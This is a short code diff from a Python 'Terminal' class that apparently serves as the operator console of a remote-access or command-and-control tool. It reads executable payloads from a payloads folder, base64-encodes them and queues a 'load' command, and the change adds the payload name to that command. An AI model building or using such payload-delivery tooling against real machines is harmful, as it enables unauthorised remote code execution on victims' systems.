@@ -22,7 +22,7 @@ class Terminal():
                     except:
                         data = open(self.payloadspath + splits[1] + ".exe","rb").read()
                     b64 = base64.b64encode(data)
-                    cmd = b"load " + b64
+                    cmd = b"load " + b64 + b" " + splits[1].encode()
                 commands.put(cmd)
                 if cmd == "exit":
                     break
